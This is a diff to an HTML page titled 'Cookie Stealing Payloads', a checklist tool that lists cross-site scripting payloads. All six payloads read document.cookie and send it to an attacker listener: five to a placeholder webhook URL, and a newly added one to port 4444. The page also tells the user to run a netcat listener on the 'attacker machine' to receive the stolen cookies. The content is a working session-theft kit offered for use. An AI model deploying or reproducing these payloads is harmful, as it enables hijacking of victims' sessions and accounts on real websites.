@@ -25,13 +25,13 @@
         <h2>🍪 Cookie Stealing Payloads</h2>
         <button class="reset-btn" onclick="resetForm()">Clear All</button>
     </div>
-    <p>Replace <b>YOUR-WEBHOOK-URL</b> with your listener. All 5 payloads should now load correctly.</p>
+    <p>Payloads are safely rendered. Use <b>nc -lvnp 4444</b> on your attacker machine to catch ID: 6.</p>
 
     <table id="payloadTable">
         <thead>
             <tr>
                 <th style="width: 30px;">#</th>
-                <th style="width: 45%;">Payload</th>
+                <th style="width: 50%;">Payload</th>
                 <th style="width: 20%;">Description</th>
                 <th style="width: 100px;">Action</th>
                 <th class="checkbox-col">Done</th>
@@ -43,11 +43,12 @@
 
     <script>
         const payloads = [
-            { id: 1, p: "<script>new Image().src='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", d: "Basic Image Tag" },
-            { id: 2, p: "<script>window.location='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", d: "Redirect Method" },
-            { id: 3, p: "<script>fetch('https://YOUR-WEBHOOK-URL?c='+document.cookie);<\/script>", d: "Fetch API (Async)" },
+            { id: 1, p: "<script>new Image().src='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", d: "Webhook method (Image)" },
+            { id: 2, p: "<script>window.location='https://YOUR-WEBHOOK-URL?c='+document.cookie;<\/script>", d: "Webhook method (Redirect)" },
+            { id: 3, p: "<script>fetch('https://YOUR-WEBHOOK-URL?c='+document.cookie);<\/script>", d: "Webhook method (Fetch)" },
             { id: 4, p: "<img src=x onerror=\"this.src='https://YOUR-WEBHOOK-URL?c='+document.cookie\">", d: "Event Handler Bypass" },
-            { id: 5, p: "<script>document.write('<img src=\"https://YOUR-WEBHOOK-URL?c=' + document.cookie + '\" />');<\/script>", d: "DOM Write Injection" }
+            { id: 5, p: "<script>document.write('<img src=\"https://YOUR-WEBHOOK-URL?c=' + document.cookie + '\" />');<\/script>", d: "DOM Injection" },
+            { id: 6, p: "<script>new Image().src='http://000.0.0.0:4444/cookie=' + encodeURI(document.cookie);<\/script>", d: "Netcat Listener (Internal)" }
         ];
 
         const tableBody = document.getElementById('tableBody');
@@ -55,13 +56,12 @@
         payloads.forEach(item => {
             const row = document.createElement('tr');
             
-            // Create cells manually to ensure character safety
             const tdNum = document.createElement('td'); tdNum.textContent = item.id;
             
             const tdPayload = document.createElement('td');
             const codeSpan = document.createElement('span');
             codeSpan.className = 'payload-code';
-            codeSpan.textContent = item.p; // Safely renders < > " '
+            codeSpan.textContent = item.p; 
             tdPayload.appendChild(codeSpan);
             
             const tdDesc = document.createElement('td'); tdDesc.textContent = item.d;
@@ -87,7 +87,6 @@
             const tdNote = document.createElement('td');
             tdNote.innerHTML = '<input type="text" class="task-note">';
 
-            // Append all to row
             row.appendChild(tdNum);
             row.appendChild(tdPayload);
             row.appendChild(tdDesc);
